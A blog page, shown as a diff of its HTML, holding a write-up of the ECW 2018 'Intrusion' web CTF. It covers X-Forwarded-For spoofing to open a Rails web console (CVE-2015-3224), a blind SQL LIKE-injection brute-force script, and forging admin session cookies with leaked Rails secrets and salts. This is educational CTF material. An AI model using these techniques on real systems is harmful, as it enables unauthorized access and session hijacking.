@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="ECW 2018 is a French Jeopardy challenge organized by the PEC (French Pôle d&rsquo;Excellence Cyber) in partnership with the Bretagne county, Airbus and Thales.  Intrusion is a 4 (&#43;1 extra) challenge based realist web scenario. It aims Ruby on Rails and cookie manipulation in order to become admin on the production website." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/en/writeups/ecw-2018/web-intrusion/" />
-<meta property="article:published_time" content="2018-10-21T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2018-10-21T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2018-10-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-10-21T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/fr/writeups/ecw-2018/web-intrusion/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,382 +230,251 @@
   </header>
   <div class="post">
     <p>ECW 2018 is a French Jeopardy challenge organized by the PEC (French Pôle d&rsquo;Excellence Cyber) in partnership with the Bretagne county, Airbus and Thales.  Intrusion is a 4 (+1 extra) challenge based realist web scenario. It aims Ruby on Rails and cookie manipulation in order to become admin on the production website.</p>
-
-<p>From 06/10 to 21/10 2018, it will be used as a pre-selection for the final Capture The Flag event, which will start on 21 November 2018 at the <a href="https://www.european-cyber-week.eu/" target=\_blank>the European Cyber Week</a> conference in Rennes.</p>
-
+<p>From 06/10 to 21/10 2018, it will be used as a pre-selection for the final Capture The Flag event, which will start on 21 November 2018 at the <!-- raw HTML omitted -->the European Cyber Week<!-- raw HTML omitted --> conference in Rennes.</p>
 <p>A very interesting challenge on several points. It allowed me to learn several tricks. Furthermore, I spent a lot of time on it. Let&rsquo;s go !</p>
-
 <p>Table of Content :</p>
-
 <ul>
 <li><a href="#intrusion-1">Intrusion 1</a>
-
 <ul>
 <li><a href="#discovery-and-information-gathering">Discovery and Information Gathering</a></li>
 <li><a href="#development-domain-and-flag-1">Development domain an Flag 1</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#intrusion-2">Intrusion 2</a>
-
 <ul>
 <li><a href="#http-request-manipulation">HTTP request manipulation</a></li>
 <li><a href="#getting-a-web-console-cve-2015-3224">Getting a web console (CVE-2015-3224)</a></li>
 <li><a href="#search-and-flag-2">Search and Flag 2</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#intrusion-hint">Intrusion hint</a>
-
 <ul>
 <li><a href="#discorery-and-identification">Discorery and Identification</a></li>
 <li><a href="#exploitation-and-results">Exploitation and Results</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#intrusion-3">Intrusion 3</a>
-
 <ul>
 <li><a href="#cookies-decryption">Cookies decryption</a></li>
 <li><a href="#crafting-and-connexion-to-dev-domain">Crafting and connexion to dev domain</a></li>
 <li><a href="#getting-3rd-flag">Getting 3rd flag</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#intrusion-4">Intrusion 4</a>
-
 <ul>
 <li><a href="#crafting-a-cookie-for-production-domain">Crafting a cookie for production domain</a></li>
 <li><a href="#connection-and-flag-4">Connection and Flag 4</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#conclusion-and-feedback">Conclusion and Feedback</a></li>
 </ul>
-
 <h2 id="intrusion-1">Intrusion 1</h2>
-
 <h3 id="discovery-and-information-gathering">Discovery and Information Gathering</h3>
-
 <p>The challenge begins with the following statement and a company&rsquo;s website.</p>
-
 <pre><code>Cette startup est prometteuse!
 Ils proposent de collecter de nombreux identifiants dans un seul endroit...
 Peut-on s'introduire dans leur system?
-</code></pre>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_1.png" alt="ECW2018_intrusion_1" class="imgSize"/></center></p>
-
+</code></pre><!-- raw HTML omitted -->
 <p>An authentication page and a &ldquo;Work in Progress&rdquo; page are available. Some tests on the authentication form do not reveal vulnerabilities at this level. Moreover, the indication &ldquo;support us with cookies:)&rdquo; on the page clearly indicates that the challenge will be around cookies.</p>
-
 <p>After some research we inspect the files that are used when loading the website.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_2.png" alt="ECW2018_intrusion_2" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <h3 id="development-domain-and-flag-1">Development domain and Flag 1</h3>
-
 <p>Nothing unusual&hellip;. Except in the file &ldquo;thor.css&rdquo; where a paragraph seems to have been added manually.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_3.png" alt="ECW2018_intrusion_3" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>A new sub-domain! It seems to be the application development website&hellip; Maybe vulnerabilities to exploit?</p>
-
 <p>We go to the sub-domain and look at the headers&hellip;.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_4.png" alt="ECW2018_intrusion_4" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>First flag : check !</p>
-
-<hr />
-
+<hr>
 <h2 id="intrusion-2">Intrusion 2</h2>
-
 <pre><code>Comme ça vous êtes arrivé dans un lieu inattendu?
 Continuez de creuser!
-</code></pre>
-
-<h3 id="http-request-manipulation">HTTP request manipulation</h3>
-
+</code></pre><h3 id="http-request-manipulation">HTTP request manipulation</h3>
 <p>We are now on the development domain and we have to find out what to do. A good first thing may be to look at HTTP requests and see if it is possible to modify them.
 After a few attempts, you notice a strange behavior when you change the HTTP method used.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_5.png" alt="ECW2018_intrusion_5" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Thus, using the &ldquo;OPTIONS&rdquo; method, a strange error page appears, very verbose&hellip; For example, we have access to our decrypted cookie and some server-side variables.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_6.png" alt="ECW2018_intrusion_6" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <h3 id="getting-a-web-console-cve-2015-3224">Getting a web console (CVE-2015-3224)</h3>
-
 <p>Okay, new information&hellip; What can we get out of it?
-One thing must be obvious to us (well, in real life, it took me some time to notice it&hellip;) and it&rsquo;s the line :<br />
-<code>HTTP_X_FORWARDED_FOR: &quot;176.187.238.160, 10.1.10.0, 127.0.0.1&quot;</code><br />
+One thing must be obvious to us (well, in real life, it took me some time to notice it&hellip;) and it&rsquo;s the line :<br>
+<code>HTTP_X_FORWARDED_FOR: &quot;176.187.238.160, 10.1.10.0, 127.0.0.1&quot;</code><br>
 With this, it should be possible to spoof an internal IP and pretend to be an internal network machine!</p>
-
 <p>We intercept a new request in which we add a header <code>X-Forwarded-For: 127.0.0.0.1</code> and magic&hellip;</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_7.png" alt="ECW2018_intrusion_7" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>A web console ! This could be useful, a console that will allow us to execute commands on the server. I learned afterwards that this is a known vulnerability, the CVE-2015-3224.</p>
-
 <p>Good ! However, it was necessary to manually modify the request in order to obtain this console. For practical reasons, we would like all requests to be modified with the header previously used. No worries ! We configure Burp by specifying the scope (web150_dev.challenge-ecw.fr) and telling it to add a header for each request.
 Once this is done, we can test the well behavior of the system.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_8.png" alt="ECW2018_intrusion_8" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Perfect ! Let&rsquo;s continue.</p>
-
 <h3 id="search-and-flag-2">Search and Flag 2</h3>
-
 <p>We now have access to the server, through a kind of shell. What can we do with it?
 After some research about the Rails console, we discover a way to list the content of a directory:</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_9.png" alt="ECW2018_intrusion_9" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Now we have to search the server for interesting information&hellip;
 After browsing the directories, you come across a &ldquo;web_console.rb&rdquo; file located in one of the configuration directories. This would be the logical starting point given that we are in this console.
 It is also possible to read the contents of a file.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_10.png" alt="ECW2018_intrusion_10" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>A lot of information contained in there, including a long hexadecimal string.
 Once decoded&hellip;.</p>
-
 <pre><code>466c616732203d20274543577b35393438343632323131643030633963656334363866643139346537366335667d27 ==&gt; &quot;Flag2 = 'ECW{5948462211d00c9cec468fd194e76c5f}'&quot;&quot;
-</code></pre>
-
-<p>Second flag : check !</p>
-
-<hr />
-
+</code></pre><p>Second flag : check !</p>
+<hr>
 <h2 id="intrusion-hint">Intrusion hint</h2>
-
 <h3 id="discorery-and-identification">Discorery and Identification</h3>
-
 <p>This challenge has been added during the CTF challenge in order to help people. Totally uncorrelated to the scenario environment, we come across a single page with a dialog box.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_11.png" alt="ECW2018_intrusion_11" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>It seems that we are facing an SQL injection, given the indications. The application&rsquo;s behavior is tested with correct data.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_12.png" alt="ECW2018_intrusion_12" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>The indications seem to point towards a SQL Injection using the LIKE condition. Assuming that the query used by the application is of the form :</p>
-
 <pre><code>SELECT &lt;hint&gt; from &lt;table&gt; where &lt;message&gt; LIKE &quot;&lt;entree utilisateur&quot;;
-</code></pre>
-
-<p>An attempt can be made to inject the <code>%</code> character into the query. If there is an injection, the application should answer us with the retrieved lines number.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_13.png" alt="ECW2018_intrusion_13" class="imgSize"/></center></p>
-
+</code></pre><p>An attempt can be made to inject the <code>%</code> character into the query. If there is an injection, the application should answer us with the retrieved lines number.</p>
+<!-- raw HTML omitted -->
 <h3 id="exploitation-and-results">Exploitation and Results</h3>
-
 <p>So we have a functional POC. In order to test, assuming that a flag of the form &ldquo;ECW{xxx}&rdquo; is hidden, we can try the following injection <code>E%</code>.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_14.png" alt="ECW2018_intrusion_14" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Perfect ! Using that, it will be possible to list all hidden hints through a blind injection, based on the message returned to the user.</p>
-
 <p>Example :</p>
-
 <pre><code>E%   ==&gt; &quot;1 hint found in database&quot;
 EC%  ==&gt; &quot;1 hint found in database&quot;
 ECA% ==&gt; &quot;O hint found in database&quot;
 ECW% ==&gt; &quot;1 hint found in database&quot;
-</code></pre>
+</code></pre><p>Below, a script to semi-automate the process. Indeed, it is not uncommon to have a request that fails. Since my script does not handle errors, it is necessary to restart it by manually adding strings already retrieved.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> sys
 
-<p>Below, a script to semi-automate the process. Indeed, it is not uncommon to have a request that fails. Since my script does not handle errors, it is necessary to restart it by manually adding strings already retrieved.</p>
-
-<pre><code class="language-python">import requests
-import string
-import sys
-
-# Request needed informations
-BASE_URL = &quot;https://web150-hint.challenge-ecw.fr/search&quot;
-DATA = {
-    'request': '',
+<span style="color:#75715e"># Request needed informations</span>
+BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://web150-hint.challenge-ecw.fr/search&#34;</span>
+DATA <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;request&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>,
 }
 
-# Static variables
-FALSE_KEYWORD = &quot;0 hint found in database&quot;
-VULNERABLE_PARAM = &quot;request=&quot;
-INJECTION_USED = &quot;request=E%&quot;
+<span style="color:#75715e"># Static variables</span>
+FALSE_KEYWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0 hint found in database&#34;</span>
+VULNERABLE_PARAM <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;request=&#34;</span>
+INJECTION_USED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;request=E%&#34;</span>
 
-# Password variables
-result = &quot;&quot;
-tmpResult = &quot;&quot;
-charset =  string.printable.replace(&quot;%&quot;, &quot;&quot;).replace(&quot;i&quot;, &quot;&quot;)
-#charset = string.ascii_letters + string.digits + &quot;.://{}&quot;
+<span style="color:#75715e"># Password variables</span>
+result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+tmpResult <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+charset <span style="color:#f92672">=</span>  string<span style="color:#f92672">.</span>printable<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;i&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+<span style="color:#75715e">#charset = string.ascii_letters + string.digits + &#34;.://{}&#34;</span>
 
-if __name__ == &quot;__main__&quot;:
-    print(&quot;\n##########################&quot;)
-    print(&quot;##    ECW 2018 - SQLi   ##&quot;)
-    print(&quot;############################\n&quot;)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">##########################&#34;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;##    ECW 2018 - SQLi   ##&#34;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 
-    print(&quot;[+] URL injected : %s&quot; % BASE_URL)
-    print(&quot;[+] Vulnerable parameter : %s&quot; % VULNERABLE_PARAM)
-    print(&quot;[+] Injection used : %s&quot; % INJECTION_USED)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] URL injected : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> BASE_URL)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Vulnerable parameter : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> VULNERABLE_PARAM)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Injection used : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> INJECTION_USED)
 
-    print(&quot;\n[+] Starting bruteforce\n&quot;)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Starting bruteforce</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 
 
-    for firstLetter in charset:
-        result = &quot;&quot;
-        DATA['request'] = firstLetter + &quot;%&quot;
-        req = requests.post(BASE_URL, data=DATA)
-        if FALSE_KEYWORD not in req.text:
-            #result += firstLetter
-            result = &quot;&quot;
-            #print(&quot;FOUND ONE ! letter : %c&quot; % firstLetter)
-            for i in range(0,100):
-                for letter in charset:
-                    DATA['request'] = result + letter + &quot;%&quot;
-                    req = requests.post(BASE_URL, data=DATA)
-                    if FALSE_KEYWORD not in req.text:
-                        result += letter
-                        print(&quot;result : %s&quot; % result)
-                        break;
-</code></pre>
-
-<p>And here is an example of how to recover one hint.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_15.png" alt="ECW2018_intrusion_15" class="imgSize"/></center></p>
-
+    <span style="color:#66d9ef">for</span> firstLetter <span style="color:#f92672">in</span> charset:
+        result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+        DATA[<span style="color:#e6db74">&#39;request&#39;</span>] <span style="color:#f92672">=</span> firstLetter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#34;</span>
+        req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(BASE_URL, data<span style="color:#f92672">=</span>DATA)
+        <span style="color:#66d9ef">if</span> FALSE_KEYWORD <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> req<span style="color:#f92672">.</span>text:
+            <span style="color:#75715e">#result += firstLetter</span>
+            result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+            <span style="color:#75715e">#print(&#34;FOUND ONE ! letter : %c&#34; % firstLetter)</span>
+            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">100</span>):
+                <span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> charset:
+                    DATA[<span style="color:#e6db74">&#39;request&#39;</span>] <span style="color:#f92672">=</span> result <span style="color:#f92672">+</span> letter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#34;</span>
+                    req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(BASE_URL, data<span style="color:#f92672">=</span>DATA)
+                    <span style="color:#66d9ef">if</span> FALSE_KEYWORD <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> req<span style="color:#f92672">.</span>text:
+                        result <span style="color:#f92672">+=</span> letter
+                        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;result : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> result)
+                        <span style="color:#66d9ef">break</span>;
+</code></pre></div><p>And here is an example of how to recover one hint.</p>
+<!-- raw HTML omitted -->
 <p>Once all elements have been extracted, we obtain this:</p>
-
 <pre><code>http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html
 https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028
 /home/web200/smart_stuff/config/initializers/web_console.rb
 /home/web200/smart_stuff/config/secrets.yml
 ECW{ebbbb414c38020906fd34bdd49ceea36}
-</code></pre>
-
-<p>Hint Flag : check !</p>
-
-<hr />
-
+</code></pre><p>Hint Flag : check !</p>
+<hr>
 <h2 id="intrusion-3">Intrusion 3</h2>
-
 <pre><code>Certaines fois privesc no signifie pas être root...
 Ce flag est un point de passage vers la prochaine étape (ECW{&lt;md5&gt;})
-</code></pre>
-
-<h3 id="cookies-decryption">Cookies decryption</h3>
-
+</code></pre><h3 id="cookies-decryption">Cookies decryption</h3>
 <p>I first retrieved the link to Github&rsquo;s gist. This one shows a piece of code used to decrypt some cookies in Ruby. Maybe it&rsquo;s the same system used in the challenge ?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;cgi&#39;</span>
+require <span style="color:#e6db74">&#39;json&#39;</span>
+require <span style="color:#e6db74">&#39;active_support&#39;</span>
 
-<pre><code class="language-ruby">require 'cgi'
-require 'json'
-require 'active_support'
-
-def verify_and_decrypt_session_cookie(cookie, secret_key_base)
-  cookie = CGI::unescape(cookie)
-  salt         = 'encrypted cookie'
-  signed_salt  = 'signed encrypted cookie'
-  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
-  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
-  sign_secret = key_generator.generate_key(signed_salt)
-  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
-  encryptor.decrypt_and_verify(cookie)
-end
-</code></pre>
-
-<p>Based on this assumption, several elements are necessary :</p>
-
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_and_decrypt_session_cookie</span>(cookie, secret_key_base)
+  cookie <span style="color:#f92672">=</span> <span style="color:#66d9ef">CGI</span><span style="color:#f92672">::</span>unescape(cookie)
+  salt         <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;encrypted cookie&#39;</span>
+  signed_salt  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;signed encrypted cookie&#39;</span>
+  key_generator <span style="color:#f92672">=</span> <span style="color:#66d9ef">ActiveSupport</span><span style="color:#f92672">::</span><span style="color:#66d9ef">KeyGenerator</span><span style="color:#f92672">.</span>new(secret_key_base, <span style="color:#e6db74">iterations</span>: <span style="color:#ae81ff">1000</span>)
+  secret <span style="color:#f92672">=</span> key_generator<span style="color:#f92672">.</span>generate_key(salt)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ActiveSupport</span><span style="color:#f92672">::</span><span style="color:#66d9ef">MessageEncryptor</span><span style="color:#f92672">.</span>key_len<span style="color:#f92672">]</span>
+  sign_secret <span style="color:#f92672">=</span> key_generator<span style="color:#f92672">.</span>generate_key(signed_salt)
+  encryptor <span style="color:#f92672">=</span> <span style="color:#66d9ef">ActiveSupport</span><span style="color:#f92672">::</span><span style="color:#66d9ef">MessageEncryptor</span><span style="color:#f92672">.</span>new(secret, sign_secret, <span style="color:#e6db74">serializer</span>: <span style="color:#66d9ef">JSON</span>)
+  encryptor<span style="color:#f92672">.</span>decrypt_and_verify(cookie)
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>Based on this assumption, several elements are necessary :</p>
 <ul>
 <li>The encryption salt ;</li>
 <li>The signature salt ;</li>
 <li>The key to encrypt/decrypt the cookie.</li>
 </ul>
-
 <p>We must therefore find these elements. To do this, we start again a research phase on the server, starting with the second file recovered in hints : <code>/home/web200/smart_stuff/config/secrets.yml</code></p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_16.png" alt="ECW2018_intrusion_16" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Good ! It seems we have found some encryption keys. One for the dev domain, and one for something else (useful?). So we are missing salts.
 After a lot of research, we come across an interesting file.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_17.png" alt="ECW2018_intrusion_17" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Two variables <code>encrypted_cookie_salt='ECW-secret-salt'</code> and <code>encrypted_signed_cookie_salt='ECW-signature-secret-salt'</code> are used. Perfect ! We have everything we need to decrypt our cookie.
 After many tests and attempts to decrypt a cookie locally (through the second script), I tried to process them directly in the web console. It turns out that it works very well with the first script given.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_18.png" alt="ECW2018_intrusion_18" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>It should also be noted that the script returns by default data formatted in JSON. In our case, however, it is Marshal. It took me some time to find out why the cookie was misread and especially to find out what the Marshal was&hellip;</p>
-
 <h3 id="crafting-and-connexion-to-dev-domain">Crafting and connexion to dev domain</h3>
-
 <p>We now know what the cookie is made of. You can see a &ldquo;User&rdquo; object containing only &ldquo;nil&rdquo; (=null) fields. Makes sense since we don&rsquo;t have a user. But&hellip; Would it be possible to impersonate one with fake informations ?</p>
-
 <p>Knowing the different elements used to decrypt the cookie, we should be able to encrypt it again.</p>
-
 <p>The modification of the User object is done like this :</p>
-
 <pre><code>cookie['user']['password'] = &quot;YouLostTheGame&quot;
-</code></pre>
-
-<p>This way, you can modify all necessary attributes.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_19.png" alt="ECW2018_intrusion_19" class="imgSize"/></center></p>
-
+</code></pre><p>This way, you can modify all necessary attributes.</p>
+<!-- raw HTML omitted -->
 <p>Once the cookie has been crafted, you can try to modify your own session cookie by intercepting a request with Burp. Result&hellip;</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_20.png" alt="ECW2018_intrusion_20" class="imgSize"/></center></p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_21.png" alt="ECW2018_intrusion_21" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>Connected with admin privileges on the development domain ! Functional POC:)</p>
-
 <h3 id="getting-3rd-flag">Getting 3rd flag</h3>
-
 <p>We now know how to decrypt a cookie, modify it and then encrypt it again in order to use it to connect. But we still don&rsquo;t have any information about the location of flag 3&hellip;.</p>
-
 <p>However, we know that the purpose of the challenge is to connect to the production domain and the statement of challenge 3 indicates that the flag is located on a crossing point to the last challenge. From this, we suspect that it is necessary to find the encryption key of the production domain.</p>
-
 <p>Another remaining hint&hellip; This is the manual page of &ldquo;systemctl&rdquo;. After some research on systemctl, we learnt that &ldquo;units&rdquo; can be created for systemd. These &ldquo;units&rdquo; behave according to instructions written in a configuration file, located in the <code>/etc/systemd/system/</code> directory. Why don&rsquo;t we take a look around this ?</p>
-
 <p>[NOTE] I didn&rsquo;t saw it because I didn&rsquo;t solved this challenge before doing the hint, but it turns out that indications about using systemd are also available, especially in the file <code>web_console.rb</code></p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_22.png" alt="ECW2018_intrusion_22" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>There are two files <code>rails-dev.service</code> and <code>rails-prd.service</code>. Nothing very interesting on the dev file, however, on the production configuration file&hellip;.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_23.png" alt="ECW2018_intrusion_23" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>The key to production domain ! Which also serves as a flag for the 3rd challenge.</p>
-
 <p>Third flag : check !</p>
-
-<hr />
-
+<hr>
 <h2 id="intrusion-4">Intrusion 4</h2>
-
 <pre><code>Le dernier Flag, vous devriez savoir où il est caché désormais!
 Mais l'attraper est plus facile à dire qu'à faire ;)
-</code></pre>
-
-<h3 id="crafting-a-cookie-for-production-domain">Crafting a cookie for production domain</h3>
-
+</code></pre><h3 id="crafting-a-cookie-for-production-domain">Crafting a cookie for production domain</h3>
 <p>Now we have all necessary elements. First, we decrypt the cookie we retrieve from the production domain. Cookie which seems to be much shorter than the previous ones.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_24.png" alt="ECW2018_intrusion_24" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>No user for this cookie&hellip; But can we add one?
 The same procedure as the development cookie is reproduced by simply changing the encryption key to <code>secret_key_base = &quot;A_cookie_of_course&quot;</code> and once the cookie is crafted, an attempt is made to inject it by intercepting a request.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_25.png" alt="ECW2018_intrusion_25" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <h3 id="connection-and-flag-4">Connection and Flag 4</h3>
-
 <p>New cookie results&hellip;</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_26.png" alt="ECW2018_intrusion_26" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>We are connected as administrator on the production domain ! It is now enough to look for the last flag :).
 The <code>/admin/console</code> page is unavailable and redirects to the home page. However, when you search the application files, you will find an <code>/admin</code>.</p>
-
-<p><center><img src="/img/writeups/ecw-2018/web-intrusion/ECW2018_intrusion_27.png" alt="ECW2018_intrusion_27" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>I don&rsquo;t have the screenshot anymore, but accessing <code>https://web150-smartstuff.challenge-ecw.fr/admin</code> return a page containing the flag !</p>
